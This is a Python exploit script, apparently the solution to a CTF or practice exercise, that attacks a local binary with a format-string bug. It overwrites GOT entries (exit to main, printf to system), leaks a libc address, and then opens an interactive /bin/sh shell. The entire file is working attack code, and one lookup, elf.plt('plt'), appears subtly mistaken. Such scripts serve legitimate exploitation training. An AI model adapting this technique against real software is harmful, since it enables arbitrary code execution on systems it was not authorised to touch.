from ptrlib import *


binpath = "../../../problems/00-stack/fsb/hard"
libcpath = "/usr/lib/libc.so.6"
io = Process(binpath)
elf = ELF(binpath)
libc = ELF(libcpath)


# before FSB: *ptr == before
# after FSB: *ptr == after
def fsb_payload(ptr, before, after):
    before = p64(before)
    after = p64(after)

    fsb_list = []
    for i in range(4):
        if u16(before[2 * i : 2 * i + 2]) == u16(after[2 * i : 2 * i + 2]):
            continue
        value = u16(after[2 * i : 2 * i + 2])
        fsb_list.append([ptr + 2 * i, value])

    max_bytes = len(fsb_list) * 13  # %12345c%10$hn ← 13文字
    max_bytes_aligned = (max_bytes + 7) // 8 * 8

    payload = ""
    printed_bytes = 0
    for i, (_, value) in enumerate(fsb_list):
        addr_pos_in_stack = 6 + max_bytes_aligned // 8 + i
        nbytes = value - printed_bytes % 0x10000
        if nbytes < 0:
            nbytes += 0x10000
        payload += f"%{nbytes}c%{addr_pos_in_stack}$hn"
        printed_bytes += nbytes
    payload += "\0" * (max_bytes_aligned - len(payload))
    payload = payload.encode()

    # 8 byte ごとに改行を入れて出力
    for i in range(0, len(payload), 8):
        print(payload[i : min(i + 8, len(payload))])

    for addr, _ in fsb_list:
        payload += p64(addr)

    assert len(payload) <= 0x30
    return payload


# default: *(exit@got) == exit@plt+6
# result of GOT overwrite: *(exit@got) == main
def ret2main():
    addr_exit_got = elf.got("exit") or 0
    addr_exit_plt = elf.plt("plt") or 0
    addr_main = elf.symbol("main") or 0

    payload = fsb_payload(addr_exit_got, addr_exit_plt + 6, addr_main)
    io.sendafter("Input message\n", payload)
    return


def libc_leak():
    addr_setbuf_got = elf.got("setbuf") or 0

    payload = flat(
        [
            u64(b"%7$s"),
            addr_setbuf_got,
        ],
        map=p64,
    )
    io.sendafter("Input message\n", payload)

    addr_setbuf = u64(io.recv(6))
    offset_setbuf = libc.symbol("setbuf") or 0
    libc.base = addr_setbuf - offset_setbuf
    return


def printf_to_system():
    addr_printf_got = elf.got("printf") or 0
    addr_printf = libc.symbol("printf") or 0
    addr_system = libc.symbol("system") or 0

    payload = fsb_payload(addr_printf_got, addr_printf, addr_system)
    io.sendafter("Input message\n", payload)
    return


def input_rdi():
    io.sendafter("Input message\n", b"/bin/sh\x00")
    return


def main():
    ret2main()
    libc_leak()
    printf_to_system()
    input_rdi()
    io.interactive()
    return


if __name__ == "__main__":
    main()
